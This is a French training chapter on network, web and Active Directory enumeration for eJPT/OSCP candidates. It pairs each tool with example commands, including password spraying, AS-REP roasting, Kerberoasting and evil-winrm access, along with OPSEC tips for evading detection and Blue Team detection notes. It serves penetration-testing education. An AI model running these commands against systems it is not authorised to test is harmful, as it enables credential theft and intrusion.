# Chapitre : Énumération

Ce chapitre est destiné aux débutants préparant les certifications eJPT ou OSCP et fait partie du module "Foundations" du Offensive & Purple Security Hub.
## Introduction

L'énumération constitue la pierre angulaire de toute opération de sécurité offensive. Contrairement à la reconnaissance (recon) qui collecte des informations générales et publiques, l'énumération implique une interaction directe avec les systèmes cibles pour identifier précisément les services, utilisateurs, et vulnérabilités exploitables. Cette phase méthodique transforme les données brutes en intelligence actionnable.

Pour l'attaquant, l'énumération révèle les chemins d'attaque potentiels : partages réseau mal configurés, applications web vulnérables, ou comptes utilisateurs exposés. Pour la défense (Blue Team), comprendre ces techniques permet d'anticiper les mouvements adverses, de détecter les activités suspectes dans les journaux, et de renforcer les contrôles de sécurité aux points critiques.

L'art de l'énumération repose sur la patience et la méthodologie : chaque information découverte peut devenir le maillon essentiel d'une chaîne d'exploitation ou d'une stratégie de défense proactive.
## Énumération Réseaux

L'énumération réseau constitue la première ligne d'investigation lors d'un test d'intrusion. Cette phase critique permet d'identifier les services exposés, les protocoles vulnérables et les configurations incorrectes qui pourraient servir de points d'entrée.

### SMB (Server Message Block)

Le protocole SMB, utilisé pour le partage de fichiers et d'imprimantes dans les environnements Windows, représente une cible privilégiée en raison de sa richesse en informations.

#### smbclient

**But** : Client SMB pour Linux permettant d'interagir avec les partages réseau Windows.

**Exemple de commande** :
```bash
# Lister les partages disponibles
smbclient -L //10.10.10.10 -N

# Se connecter à un partage spécifique
smbclient //10.10.10.10/share -U username
```

**Atouts** : Interface interactive similaire à FTP, permet de naviguer et manipuler les fichiers directement.

**Limites** : Moins efficace pour l'automatisation, nécessite parfois plusieurs commandes pour obtenir une vue complète.

**Meilleur contexte** : Exploration manuelle des partages SMB, téléchargement/upload de fichiers, exécution de commandes sur les partages.

#### smbmap

**But** : Cartographie des partages SMB avec vérification des permissions par utilisateur.

**Exemple de commande** :
```bash
# Énumération basique avec utilisateur anonyme
smbmap -H 10.10.10.10 -u anonymous

# Énumération avec identifiants
smbmap -H 10.10.10.10 -d domaine -u utilisateur -p mot_de_passe

# Recherche récursive de fichiers
smbmap -H 10.10.10.10 -u utilisateur -p mot_de_passe -R partage --depth 5
```

**Atouts** : Affichage clair des permissions (READ, WRITE, NO ACCESS), recherche récursive de fichiers, exécution de commandes à distance.

**Limites** : Moins interactif que smbclient, peut générer beaucoup de bruit réseau en mode récursif.

**Meilleur contexte** : Évaluation rapide des permissions sur plusieurs partages, recherche de fichiers sensibles.

#### enum4linux-ng

**But** : Version améliorée d'enum4linux pour l'énumération complète des systèmes Windows/Samba.

**Exemple de commande** :
```bash
# Énumération complète
enum4linux-ng -A 10.10.10.10

# Énumération ciblée des utilisateurs
enum4linux-ng -U 10.10.10.10

# Énumération avec identifiants
enum4linux-ng -u 'utilisateur' -p 'mot_de_passe' 10.10.10.10
```

**Atouts** : Outil tout-en-un combinant plusieurs techniques d'énumération, sortie JSON disponible, support des dernières versions de Windows.

**Limites** : Peut être bruyant sur le réseau, certaines fonctionnalités dépendent des configurations du serveur cible.

**Meilleur contexte** : Première phase d'énumération pour obtenir une vue d'ensemble d'un système Windows.

#### crackmapexec (CME)

**But** : Suite d'outils polyvalente pour l'énumération et l'exploitation des environnements Windows.

**Exemple de commande** :
```bash
# Énumération SMB basique
crackmapexec smb 10.10.10.10

# Énumération avec identifiants
crackmapexec smb 10.10.10.10 -u utilisateur -p mot_de_passe --shares

# Énumération sur un réseau
crackmapexec smb 10.10.10.0/24 -u utilisateur -p mot_de_passe
```

**Atouts** : Support de multiples protocoles (SMB, WinRM, MSSQL), modules d'exploitation intégrés, capacité de traitement par lots.

**Limites** : Courbe d'apprentissage plus élevée, peut déclencher des alertes de sécurité en raison de son empreinte.

**Meilleur contexte** : Énumération et exploitation à grande échelle, tests de mots de passe sur plusieurs systèmes.

### FTP (File Transfer Protocol)

Le protocole FTP, souvent mal configuré, peut révéler des informations précieuses ou offrir un accès non autorisé aux fichiers.

#### Analyse des bannières FTP

**But** : Identifier la version et la configuration du serveur FTP.

**Exemple de commande** :
```bash
# Connexion manuelle pour récupérer la bannière
nc -nv 10.10.10.10 21

# Utilisation de nmap pour l'analyse de bannière
nmap -sV -p 21 10.10.10.10
```

**Atouts** : Technique passive, révèle souvent la version exacte du serveur.

**Limites** : Les bannières peuvent être modifiées ou désactivées.

**Meilleur contexte** : Première étape d'énumération FTP, recherche de versions vulnérables.

#### Scripts nmap FTP

**But** : Automatiser l'énumération des serveurs FTP avec des scripts spécialisés.

**Exemple de commande** :
```bash
# Vérifier l'accès anonyme
nmap --script=ftp-anon -p 21 10.10.10.10

# Exécuter tous les scripts FTP
nmap --script=ftp-* -p 21 10.10.10.10

# Vérifier les vulnérabilités FTP
nmap --script=ftp-vuln* -p 21 10.10.10.10
```

**Atouts** : Automatisation de plusieurs vecteurs d'énumération, détection de configurations dangereuses.

**Limites** : Peut manquer certaines configurations spécifiques, génère du trafic réseau identifiable.

**Meilleur contexte** : Évaluation rapide et complète d'un serveur FTP.

### SNMP (Simple Network Management Protocol)

SNMP est un protocole de gestion réseau qui peut révéler une mine d'informations sur les systèmes.

#### snmpwalk

**But** : Parcourir l'arborescence d'informations SNMP d'un appareil.

**Exemple de commande** :
```bash
# Énumération basique avec communauté public
snmpwalk -v 2c -c public 10.10.10.10

# Énumération ciblée des processus en cours
snmpwalk -v 2c -c public 10.10.10.10 1.3.6.1.2.1.25.4.2.1.2

# Énumération des utilisateurs système
snmpwalk -v 2c -c public 10.10.10.10 1.3.6.1.4.1.77.1.2.25
```

**Atouts** : Exploration détaillée de l'arborescence SNMP, extraction d'informations précises.

**Limites** : Nécessite de connaître la communauté SNMP, peut générer beaucoup de données à analyser.

**Meilleur contexte** : Extraction d'informations détaillées une fois la communauté SNMP connue.

#### onesixtyone

**But** : Scanner rapide pour identifier les communautés SNMP.

**Exemple de commande** :
```bash
# Scanner avec liste de communautés par défaut
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 10.10.10.10

# Scanner un réseau
onesixtyone -c communautés.txt 10.10.10.0/24
```

**Atouts** : Rapide, efficace pour découvrir les communautés SNMP accessibles.

**Limites** : Limité à la découverte de communautés, ne fournit pas d'informations détaillées.

**Meilleur contexte** : Première étape d'énumération SNMP pour identifier les cibles accessibles.

### LDAP / Kerberos

Les protocoles d'authentification et d'annuaire comme LDAP et Kerberos sont essentiels dans les environnements Active Directory.

#### ldapsearch

**But** : Outil de recherche dans les annuaires LDAP.

**Exemple de commande** :
```bash
# Recherche anonyme
ldapsearch -x -H ldap://10.10.10.10 -b "dc=exemple,dc=com"

# Recherche authentifiée
ldapsearch -x -H ldap://10.10.10.10 -D "cn=utilisateur,dc=exemple,dc=com" -w mot_de_passe -b "dc=exemple,dc=com"

# Recherche d'utilisateurs spécifiques
ldapsearch -x -H ldap://10.10.10.10 -b "dc=exemple,dc=com" "(objectClass=user)"
```

**Atouts** : Requêtes précises et filtrables, support de l'authentification, extraction d'attributs spécifiques.

**Limites** : Nécessite une connaissance de la structure LDAP, syntaxe parfois complexe.

**Meilleur contexte** : Extraction ciblée d'informations dans un annuaire LDAP connu.

#### kerbrute

**But** : Outil de brute force et d'énumération pour Kerberos.

**Exemple de commande** :
```bash
# Énumération d'utilisateurs
kerbrute userenum -d exemple.com --dc 10.10.10.10 utilisateurs.txt

# Test de mots de passe
kerbrute passwordspray -d exemple.com --dc 10.10.10.10 utilisateurs_valides.txt mot_de_passe
```

**Atouts** : Rapide, génère peu d'événements de sécurité, validation d'utilisateurs sans authentification.

**Limites** : Limité aux fonctionnalités Kerberos, nécessite une liste d'utilisateurs potentiels.

**Meilleur contexte** : Validation discrète d'utilisateurs dans un domaine Active Directory.

#### Outils impacket

**But** : Suite d'outils Python pour interagir avec les protocoles réseau Windows.

**Exemple de commande** :
```bash
# AS-REP Roasting (GetNPUsers.py)
GetNPUsers.py exemple.com/ -usersfile utilisateurs.txt -format hashcat -outputfile hashes.txt

# Kerberoasting (GetUserSPNs.py)
GetUserSPNs.py exemple.com/utilisateur:mot_de_passe -outputfile spn-hashes.txt

# Énumération des SID (lookupsid.py)
lookupsid.py exemple.com/utilisateur:mot_de_passe@10.10.10.10
```

**Atouts** : Outils spécialisés pour chaque technique, exploitation directe des vulnérabilités de protocole.

**Limites** : Nécessite souvent des identifiants valides, peut générer des événements de sécurité.

**Meilleur contexte** : Exploitation avancée des protocoles Windows après obtention d'identifiants initiaux.

### Considérations OPSEC (Sécurité Opérationnelle)

L'énumération réseau peut déclencher des alertes de sécurité. Voici quelques précautions :

1. **Limitation de vitesse** : Utilisez les options de temporisation (`--delay` dans nmap, `-T2` pour un scan discret).
2. **Ciblage précis** : Évitez les scans de réseau complet si possible, ciblez les ports et services spécifiques.
3. **Privilégiez les techniques passives** : L'analyse de bannières et les requêtes légitimes génèrent moins d'alertes.
4. **Authentification limitée** : Évitez les tentatives multiples d'authentification qui peuvent déclencher des verrouillages de compte.

### Perspective Blue Team

Pour les défenseurs, l'énumération réseau laisse des traces identifiables :

1. **Signatures de scan** : Surveillez les connexions multiples depuis une même source vers différents ports/hôtes.
2. **Requêtes LDAP/SMB anormales** : Les requêtes d'énumération suivent rarement les modèles d'utilisation légitimes.
3. **Échecs d'authentification** : Les tentatives répétées avec différents utilisateurs ou depuis des sources inhabituelles.
4. **Accès aux partages sensibles** : Surveillez particulièrement les accès aux partages administratifs (C$, ADMIN$).

La détection précoce de l'énumération permet d'identifier une attaque potentielle avant qu'elle n'atteigne la phase d'exploitation.
## Énumération Web

L'énumération web représente un pilier fondamental des tests d'intrusion modernes. Les applications web, omniprésentes et souvent complexes, offrent une surface d'attaque considérable qui nécessite une approche méthodique et structurée.

### Workflow d'énumération web

Une énumération web efficace suit généralement cette progression :

1. **Identification des technologies** : Déterminer le serveur web, les frameworks, CMS et autres composants
2. **Découverte de contenu** : Identifier les répertoires, fichiers et points d'entrée cachés
3. **Analyse des fonctionnalités** : Comprendre les fonctionnalités de l'application et leurs interactions
4. **Recherche de vulnérabilités** : Utiliser des scanners spécialisés pour détecter les faiblesses
5. **Analyse manuelle** : Approfondir les zones d'intérêt identifiées automatiquement

### Découverte de contenu

#### dirb

**But** : Scanner de répertoires et fichiers web basé sur des dictionnaires.

**Exemple de commande** :
```bash
# Scan basique
dirb http://10.10.10.10

# Scan avec dictionnaire personnalisé
dirb http://10.10.10.10 /chemin/vers/wordlist.txt

# Scan avec extension spécifique
dirb http://10.10.10.10 -X .php,.txt,.bak
```

**Atouts** : Simple d'utilisation, dictionnaires intégrés, détection automatique des codes de réponse.

**Limites** : Relativement lent, options de filtrage limitées, pas de multithreading avancé.

**Meilleur contexte** : Énumération initiale sur des cibles simples, utilisation rapide sans configuration complexe.

#### gobuster

**But** : Outil de brute force pour URI, sous-domaines et vhosts avec multithreading.

**Exemple de commande** :
```bash
# Mode directory (dir)
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Mode vhost
gobuster vhost -u http://exemple.com -w sous-domaines.txt

# Mode dns
gobuster dns -d exemple.com -w sous-domaines.txt
```

**Atouts** : Très rapide grâce au multithreading, modes spécialisés (dir, vhost, dns), options de filtrage avancées.

**Limites** : Peut surcharger les serveurs cibles, nécessite une configuration plus précise que dirb.

**Meilleur contexte** : Énumération approfondie de sites web complexes, recherche de sous-domaines et vhosts.

#### ffuf (Fuzz Faster U Fool)

**But** : Fuzzer web polyvalent et hautement configurable.

**Exemple de commande** :
```bash
# Découverte de répertoires
ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Découverte de vhosts
ffuf -u http://10.10.10.10 -H "Host: FUZZ.exemple.com" -w sous-domaines.txt

# Fuzzing de paramètres avec filtrage par taille
ffuf -u http://10.10.10.10/api.php?id=FUZZ -w nombres.txt -fs 4242
```

**Atouts** : Extrêmement flexible, filtrage avancé (taille, mots, temps, codes), colorisation des résultats, multithreading efficace.

**Limites** : Courbe d'apprentissage plus élevée, peut nécessiter une configuration fine pour éviter les faux positifs.

**Meilleur contexte** : Fuzzing avancé, énumération précise avec filtrage, tests d'injection de paramètres.

### Analyse de CMS

#### wpscan

**But** : Scanner spécialisé pour WordPress, identifiant plugins, thèmes et vulnérabilités.

**Exemple de commande** :
```bash
# Scan basique
wpscan --url http://10.10.10.10

# Énumération des plugins vulnérables
wpscan --url http://10.10.10.10 --enumerate vp

# Énumération complète avec API token
wpscan --url http://10.10.10.10 --enumerate ap,at,cb,dbe --api-token TOKEN
```

**Atouts** : Base de données de vulnérabilités intégrée, détection de versions, brute force d'identifiants, API pour vulnérabilités premium.

**Limites** : Spécifique à WordPress, certaines fonctionnalités nécessitent un token API.

**Meilleur contexte** : Audit de sécurité de sites WordPress, identification rapide de composants vulnérables.

#### CMSmap

**But** : Scanner multi-CMS supportant WordPress, Joomla et Drupal.

**Exemple de commande** :
```bash
# Détection automatique du CMS
cmsmap http://10.10.10.10

# Scan spécifique WordPress
cmsmap http://10.10.10.10 -f W

# Brute force d'identifiants
cmsmap http://10.10.10.10 -u admin -p passwords.txt
```

**Atouts** : Support de plusieurs CMS, détection automatique, modules d'exploitation intégrés.

**Limites** : Moins spécialisé que les scanners dédiés à un CMS spécifique.

**Meilleur contexte** : Première analyse lorsque le CMS n'est pas connu avec certitude.

### Analyse de vulnérabilités

#### nikto

**But** : Scanner de vulnérabilités web généraliste.

**Exemple de commande** :
```bash
# Scan basique
nikto -h http://10.10.10.10

# Scan avec authentification
nikto -h http://10.10.10.10 -id admin:password

# Scan avec TLS et sortie en format CSV
nikto -h https://10.10.10.10 -ssl -output scan.csv -Format csv
```

**Atouts** : Large base de tests, détection de configurations dangereuses, identification de fichiers sensibles.

**Limites** : Génère beaucoup de bruit réseau, facilement détectable, nombreux faux positifs.

**Meilleur contexte** : Analyse initiale complète, identification de problèmes de configuration évidents.

#### nuclei

**But** : Scanner basé sur des templates pour une détection précise de vulnérabilités.

**Exemple de commande** :
```bash
# Scan avec templates par défaut
nuclei -u http://10.10.10.10

# Scan avec templates de sévérité critique
nuclei -u http://10.10.10.10 -severity critical

# Scan d'une liste de cibles avec templates spécifiques
nuclei -l cibles.txt -t cves/ -t exposures/
```

**Atouts** : Hautement personnalisable, templates communautaires, faible taux de faux positifs, mise à jour régulière.

**Limites** : Efficacité dépendante de la qualité des templates, nécessite une mise à jour régulière.

**Meilleur contexte** : Détection précise de vulnérabilités connues, scans à grande échelle.

#### whatweb

**But** : Outil d'empreinte de technologies web.

**Exemple de commande** :
```bash
# Identification basique
whatweb http://10.10.10.10

# Scan agressif avec détails
whatweb -a 3 http://10.10.10.10

# Scan de plusieurs cibles avec sortie JSON
whatweb -i cibles.txt --log-json=resultats.json
```

**Atouts** : Identification précise des technologies, différents niveaux d'agressivité, format de sortie structuré.

**Limites** : Focalisé sur l'identification plutôt que l'exploitation, peut manquer certaines technologies personnalisées.

**Meilleur contexte** : Phase initiale d'énumération, préparation pour des tests ciblés.

#### wafw00f

**But** : Détection de Web Application Firewalls (WAF).

**Exemple de commande** :
```bash
# Détection simple
wafw00f http://10.10.10.10

# Détection avec sortie détaillée
wafw00f -v http://10.10.10.10

# Scan de plusieurs cibles
wafw00f -i cibles.txt
```

**Atouts** : Détection précise du type de WAF, aide à adapter les techniques d'attaque.

**Limites** : Focalisé uniquement sur la détection de WAF, peut être bloqué par certains WAF avancés.

**Meilleur contexte** : Phase préliminaire pour adapter la stratégie d'attaque en fonction des protections en place.

### Proxy et analyse

#### Burp Suite

**But** : Proxy d'interception web complet pour l'analyse et la manipulation du trafic.

**Fonctionnalités clés** :
- Proxy d'interception
- Scanner de vulnérabilités (version Pro)
- Repeater pour manipulation de requêtes
- Intruder pour tests automatisés
- Decoder/Encoder pour manipulation de données

**Atouts** : Suite complète d'outils, interface graphique intuitive, extensible via plugins.

**Limites** : Version gratuite limitée, scanner complet uniquement en version Pro (payante).

**Meilleur contexte** : Analyse approfondie d'applications web complexes, tests manuels avancés.

#### ZAP (Zed Attack Proxy)

**But** : Alternative open-source à Burp Suite pour les tests de sécurité web.

**Fonctionnalités clés** :
- Proxy d'interception
- Scanner automatique
- Spider pour découverte de contenu
- Fuzzer intégré
- Scripts d'automatisation

**Atouts** : Entièrement gratuit et open-source, fonctionnalités avancées accessibles sans licence.

**Limites** : Interface moins intuitive que Burp, certaines fonctionnalités avancées nécessitent une configuration manuelle.

**Meilleur contexte** : Alternative complète à Burp Suite, projets avec contraintes budgétaires.

### Considérations OPSEC

L'énumération web peut être particulièrement visible pour les défenseurs. Voici quelques précautions :

1. **Limitation de vitesse** : Réduisez le nombre de threads et ajoutez des délais entre les requêtes.
2. **User-Agent réaliste** : Utilisez des User-Agents courants pour se fondre dans le trafic légitime.
3. **Évitez les patterns évidents** : Les requêtes séquentielles ou alphabétiques sont facilement détectables.
4. **Privilégiez la qualité des wordlists** : Une liste courte mais pertinente génère moins de bruit qu'une liste exhaustive.
5. **Attention aux honeypots** : Certains chemins peuvent être des pièges délibérés pour détecter les scanners.

### Perspective Blue Team

Pour les défenseurs, l'énumération web présente des signatures reconnaissables :

1. **Volume anormal de requêtes 404** : Indicateur classique de scan de découverte de contenu.
2. **Requêtes vers des ressources sensibles** : Tentatives d'accès à /admin, /backup, /config, etc.
3. **User-Agents inhabituels** : Outils automatisés utilisant souvent des User-Agents spécifiques.
4. **Modèles de requêtes** : Séquences de requêtes systématiques ou alphabétiques.
5. **Requêtes malformées** : Tentatives d'injection ou de fuzzing générant des erreurs serveur.

La mise en place de WAF avec détection comportementale et l'analyse des logs permettent d'identifier ces activités d'énumération avant qu'elles ne mènent à une exploitation.
## Énumération Utilisateurs et Services Exposés

L'énumération des utilisateurs et services exposés constitue souvent le chaînon manquant entre la découverte d'un système et son exploitation. Cette phase critique permet d'identifier les comptes potentiellement vulnérables et les services mal configurés qui pourraient servir de vecteurs d'attaque.

### Utilisateurs Windows/Active Directory

Dans les environnements Windows, particulièrement ceux basés sur Active Directory, l'énumération des utilisateurs peut révéler des comptes mal sécurisés ou des configurations dangereuses.

#### rpcclient

**But** : Client pour les appels de procédure à distance Microsoft (MS-RPC).

**Exemple de commande** :
```bash
# Connexion anonyme
rpcclient -U "" -N 10.10.10.10

# Énumération des utilisateurs
rpcclient $> enumdomusers

# Informations détaillées sur un utilisateur
rpcclient $> queryuser 0x3e8
```

**Atouts** : Interaction directe avec les services RPC Windows, nombreuses commandes d'énumération intégrées.

**Limites** : Interface peu intuitive, nécessite souvent des privilèges.

**Meilleur contexte** : Énumération détaillée des utilisateurs et groupes Windows lorsqu'un accès RPC est disponible.

#### enum4linux-ng

**But** : Outil tout-en-un pour l'énumération des systèmes Windows et Samba.

**Exemple de commande** :
```bash
# Énumération des utilisateurs uniquement
enum4linux-ng -U 10.10.10.10

# Énumération complète avec authentification
enum4linux-ng -A -u "utilisateur" -p "mot_de_passe" 10.10.10.10
```

**Atouts** : Combine plusieurs techniques d'énumération, sortie structurée, version améliorée avec support JSON.

**Limites** : Peut être bruyant sur le réseau, certaines fonctionnalités dépendent des configurations du serveur.

**Meilleur contexte** : Première approche pour obtenir une vue d'ensemble des utilisateurs et groupes d'un système Windows.

#### BloodHound

**But** : Cartographie des relations dans Active Directory pour identifier les chemins d'attaque.

**Exemple de commande** :
```bash
# Collecte de données avec SharpHound
SharpHound.exe -c All

# Collecte de données avec Python (bloodhound-python)
bloodhound-python -d exemple.com -u utilisateur -p mot_de_passe -ns 10.10.10.10 -c All
```

**Atouts** : Visualisation graphique des relations, identification automatique des chemins d'attaque, analyse approfondie des privilèges.

**Limites** : Nécessite un accès initial au domaine, génère beaucoup de trafic réseau, facilement détectable.

**Meilleur contexte** : Analyse approfondie d'Active Directory après obtention d'identifiants initiaux, red team operations.

#### PowerView

**But** : Script PowerShell pour l'énumération avancée d'Active Directory.

**Exemple de commande** :
```powershell
# Obtenir tous les utilisateurs du domaine
Get-DomainUser

# Trouver les utilisateurs avec des SPN (pour Kerberoasting)
Get-DomainUser -SPN

# Identifier les chemins d'accès aux objets sensibles
Find-Path -Source "Utilisateur" -Target "Administrateurs du domaine"
```

**Atouts** : Fonctionnalités avancées d'énumération, s'exécute en mémoire, très flexible.

**Limites** : Nécessite PowerShell, souvent bloqué par les solutions EDR modernes.

**Meilleur contexte** : Énumération approfondie d'Active Directory lorsque l'exécution de PowerShell est possible.

### Kerberos

Le protocole d'authentification Kerberos, utilisé dans les environnements Active Directory, présente plusieurs vecteurs d'énumération et d'attaque.

#### kerbrute

**But** : Outil de brute force et d'énumération pour Kerberos.

**Exemple de commande** :
```bash
# Validation d'utilisateurs (user enumeration)
kerbrute userenum -d exemple.com --dc 10.10.10.10 utilisateurs.txt

# Password spraying
kerbrute passwordspray -d exemple.com --dc 10.10.10.10 utilisateurs_valides.txt Printemps2023!
```

**Atouts** : Rapide, génère peu d'événements de sécurité, validation d'utilisateurs sans authentification complète.

**Limites** : Fonctionnalités limitées à l'énumération et au brute force.

**Meilleur contexte** : Validation discrète d'utilisateurs dans un domaine Active Directory, password spraying initial.

#### GetNPUsers.py (impacket)

**But** : Extraction des TGT pour les utilisateurs sans pré-authentification Kerberos (AS-REP Roasting).

**Exemple de commande** :
```bash
# Ciblage d'utilisateurs spécifiques
GetNPUsers.py exemple.com/ -usersfile utilisateurs.txt -format hashcat -outputfile hashes.txt

# Ciblage de tous les utilisateurs avec identifiants
GetNPUsers.py exemple.com/utilisateur:mot_de_passe -request -format hashcat -outputfile hashes.txt
```

**Atouts** : Exploitation directe d'une mauvaise configuration Kerberos, obtention de hachages crackables hors ligne.

**Limites** : Nécessite des utilisateurs configurés sans pré-authentification Kerberos (configuration rare).

**Meilleur contexte** : Exploitation de configurations Kerberos dangereuses après identification d'utilisateurs valides.

#### GetUserSPNs.py (impacket)

**But** : Extraction des tickets de service pour Kerberoasting.

**Exemple de commande** :
```bash
# Extraction basique avec identifiants
GetUserSPNs.py exemple.com/utilisateur:mot_de_passe -outputfile spn-hashes.txt

# Extraction et demande immédiate de TGS
GetUserSPNs.py exemple.com/utilisateur:mot_de_passe -request -outputfile spn-hashes.txt
```

**Atouts** : Exploitation d'une fonctionnalité légitime de Kerberos, obtention de hachages potentiellement privilégiés.

**Limites** : Nécessite des identifiants valides dans le domaine, génère des événements d'authentification.

**Meilleur contexte** : Élévation de privilèges après obtention d'identifiants initiaux dans un domaine Active Directory.

### Services exposés

L'énumération des services exposés permet d'identifier des vecteurs d'attaque potentiels et des informations sur l'infrastructure.

#### Bannières SSH

**But** : Récupération d'informations à partir des bannières SSH.

**Exemple de commande** :
```bash
# Connexion manuelle
nc -nv 10.10.10.10 22

# Utilisation de nmap
nmap -sV -p 22 10.10.10.10

# Utilisation de ssh-audit
ssh-audit 10.10.10.10
```

**Atouts** : Technique passive, révèle souvent la version exacte et la configuration.

**Limites** : Les bannières peuvent être modifiées ou désactivées.

**Meilleur contexte** : Reconnaissance initiale, identification de versions potentiellement vulnérables.

#### WinRM (Windows Remote Management)

**But** : Énumération et exploitation du service de gestion à distance Windows.

**Exemple de commande** :
```bash
# Vérification de l'accessibilité avec crackmapexec
crackmapexec winrm 10.10.10.10

# Test d'identifiants
crackmapexec winrm 10.10.10.10 -u utilisateur -p mot_de_passe

# Exécution de commandes via evil-winrm
evil-winrm -i 10.10.10.10 -u utilisateur -p mot_de_passe
```

**Atouts** : Accès direct à PowerShell à distance, contournement potentiel de certaines restrictions.

**Limites** : Souvent désactivé par défaut, nécessite des identifiants valides.

**Meilleur contexte** : Exploitation post-compromission, mouvement latéral dans un réseau Windows.

#### SNMP User Enumeration

**But** : Extraction d'informations sur les utilisateurs via SNMP.

**Exemple de commande** :
```bash
# Énumération des processus (peut révéler des utilisateurs actifs)
snmpwalk -v 2c -c public 10.10.10.10 1.3.6.1.2.1.25.4.2.1.2

# Énumération directe des utilisateurs
snmpwalk -v 2c -c public 10.10.10.10 1.3.6.1.4.1.77.1.2.25
```

**Atouts** : Peut révéler des informations détaillées sur les utilisateurs et processus sans authentification.

**Limites** : Nécessite que SNMP soit mal configuré avec des communautés par défaut.

**Meilleur contexte** : Énumération passive lorsque SNMP est accessible avec des communautés par défaut.

#### smtp-user-enum

**But** : Énumération d'utilisateurs via les commandes SMTP VRFY, EXPN et RCPT TO.

**Exemple de commande** :
```bash
# Utilisation de VRFY
smtp-user-enum -M VRFY -U utilisateurs.txt -t 10.10.10.10

# Utilisation de RCPT TO
smtp-user-enum -M RCPT -U utilisateurs.txt -t 10.10.10.10 -f expediteur@exemple.com
```

**Atouts** : Technique discrète, exploite les fonctionnalités standard de SMTP.

**Limites** : De nombreux serveurs désactivent ces commandes par mesure de sécurité.

**Meilleur contexte** : Énumération initiale lorsque SMTP est exposé et mal configuré.

### Outils multi-protocoles

#### crackmapexec (CME)

**But** : Suite d'outils pour l'énumération et l'exploitation de multiples protocoles Windows.

**Exemple de commande** :
```bash
# Énumération SMB
crackmapexec smb 10.10.10.10 --users

# Énumération WinRM
crackmapexec winrm 10.10.10.10 -u utilisateur -p mot_de_passe --enum-users

# Password spraying sur LDAP
crackmapexec ldap 10.10.10.10 -u utilisateurs.txt -p mot_de_passe --continue-on-success
```

**Atouts** : Support de multiples protocoles, modules d'exploitation intégrés, traitement par lots efficace.

**Limites** : Génère beaucoup de bruit réseau, facilement détectable par les solutions de sécurité.

**Meilleur contexte** : Énumération et exploitation à grande échelle, tests de mots de passe sur plusieurs systèmes.

#### Legion

**But** : Framework d'énumération et de scan intégrant de nombreux outils.

**Fonctionnalités clés** :
- Interface graphique unifiée
- Intégration de multiples scanners (nmap, nikto, etc.)
- Gestion des résultats et reporting
- Modules d'exploitation

**Atouts** : Centralisation des outils, workflow guidé, reporting intégré.

**Limites** : Moins flexible que l'utilisation directe des outils, courbe d'apprentissage pour l'interface.

**Meilleur contexte** : Tests d'intrusion structurés, centralisation des résultats d'énumération.

### Traces dans les logs

L'énumération des utilisateurs et services laisse des traces caractéristiques dans les journaux système :

#### Windows Event Logs

- **Événement 4625** : Échecs d'authentification (tentatives de brute force)
- **Événement 4768** : Demande de ticket Kerberos TGT (AS-REQ)
- **Événement 4769** : Demande de ticket Kerberos TGS (TGS-REQ, Kerberoasting)
- **Événement 4771** : Échec de pré-authentification Kerberos (AS-REP Roasting)
- **Événement 4776** : Authentification NTLM
- **Événement 5140** : Accès aux partages réseau

#### Logs de services

- **SSH** : Tentatives de connexion dans /var/log/auth.log ou /var/log/secure
- **SMTP** : Commandes VRFY/EXPN dans les logs du serveur mail
- **Web** : Requêtes suspectes dans les logs du serveur web (access.log)
- **LDAP** : Requêtes d'énumération dans les logs du serveur LDAP

### Considérations OPSEC

L'énumération des utilisateurs et services peut déclencher de nombreuses alertes. Voici quelques précautions :

1. **Limitation des tentatives** : Évitez les brute force massifs qui génèrent de nombreux échecs d'authentification.
2. **Utilisation d'identifiants valides** : Privilégiez les techniques nécessitant un seul jeu d'identifiants valides plutôt que des tentatives multiples.
3. **Timing des opérations** : Répartissez les activités d'énumération sur une période plus longue pour éviter les pics d'activité.
4. **Ciblage précis** : Ciblez uniquement les utilisateurs ou services pertinents plutôt que des énumérations exhaustives.
5. **Privilégiez les techniques passives** : L'écoute passive et l'analyse de bannières génèrent moins d'alertes que les requêtes actives.

### Perspective Blue Team

Pour les défenseurs, l'énumération des utilisateurs et services présente des signatures reconnaissables :

1. **Échecs d'authentification multiples** : Particulièrement depuis une même source ou avec différents noms d'utilisateurs.
2. **Requêtes LDAP anormales** : Recherches massives d'utilisateurs ou d'attributs sensibles.
3. **Activité Kerberos suspecte** : Demandes de tickets pour de nombreux utilisateurs ou services.
4. **Connexions RPC/SMB inhabituelles** : Tentatives d'énumération via ces protocoles depuis des postes non administratifs.
5. **Requêtes SMTP VRFY/EXPN** : Rarement utilisées légitimement, souvent signe d'énumération.

La corrélation de ces événements avec d'autres activités suspectes permet d'identifier les phases préliminaires d'une attaque et d'intervenir avant l'exploitation.
## ⚡ Quick Ops (opérationnel < 1 h)

Cette section fournit des ressources opérationnelles pour une énumération rapide et efficace, idéale pour les examens comme l'OSCP ou les situations de temps limité.

### Tableau des commandes essentielles

| Catégorie | Outil | Commande | Description |
|-----------|-------|----------|-------------|
| **SMB** | smbmap | `smbmap -H 10.10.10.10 -u anonymous` | Énumération rapide des partages avec utilisateur anonyme |
| | crackmapexec | `crackmapexec smb 10.10.10.10 --shares` | Vérification des partages accessibles |
| | enum4linux-ng | `enum4linux-ng -A 10.10.10.10` | Énumération complète (utilisateurs, partages, politiques) |
| **LDAP** | ldapsearch | `ldapsearch -x -H ldap://10.10.10.10 -b "dc=exemple,dc=com"` | Recherche anonyme dans l'annuaire LDAP |
| | windapsearch | `windapsearch -d exemple.com -u utilisateur -p password --dc 10.10.10.10 --da` | Recherche des administrateurs de domaine |
| **Kerberos** | kerbrute | `kerbrute userenum -d exemple.com --dc 10.10.10.10 utilisateurs.txt` | Énumération rapide d'utilisateurs valides |
| | GetNPUsers.py | `GetNPUsers.py exemple.com/ -usersfile users.txt -format hashcat -outputfile hashes.txt` | AS-REP Roasting |
| **Web** | ffuf | `ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirb/common.txt` | Découverte rapide de répertoires |
| | | `ffuf -u http://10.10.10.10 -H "Host: FUZZ.exemple.com" -w sous-domaines.txt` | Découverte de sous-domaines/vhosts |
| | whatweb | `whatweb -a 3 http://10.10.10.10` | Identification des technologies web |
| | wpscan | `wpscan --url http://10.10.10.10 --enumerate vp,u` | Scan WordPress (plugins vulnérables, utilisateurs) |
| **Services** | nmap | `nmap -sC -sV -oA scan 10.10.10.10` | Scan de services avec scripts par défaut |
| | | `nmap -p- --min-rate 1000 -T4 10.10.10.10` | Scan rapide de tous les ports |
